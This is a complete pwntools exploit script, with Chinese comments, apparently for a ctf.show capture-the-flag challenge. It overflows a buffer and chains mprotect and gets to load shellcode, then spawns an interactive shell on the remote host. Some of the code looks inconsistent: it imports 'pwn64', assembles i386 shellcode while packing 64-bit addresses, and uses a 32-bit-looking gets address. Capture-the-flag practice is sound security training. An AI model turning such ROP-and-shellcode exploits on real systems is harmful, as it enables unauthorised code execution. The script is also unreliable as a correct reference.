# -*- coding: UTF-8 -*-
from pwn64 import *
u=remote("pwn.challenge.ctf.show",28162)
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
payload = b'a'*(0x20+8)
payload += p64(0x00007ffff7afd7e0) # mprotect函数地址
payload += p64(0x00000000004007e0) # 3 pop 1 ret地址
payload += p64(0x0000000000602000) # 需要修改的内存的起始地址
payload += p64(0x1000) # 修改内存空间的大小
payload += p64(0x7) # 需要赋予的权限
payload += p64(0x806bee0) # gets函数地址
payload += p64(0x0000000000602000) # gets函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)
payload += p64(0x0000000000602000) # shellcode地址
payload += p64(len(shellcode))
u.sendline(payload)
u.sendline(shellcode)
u.interactive()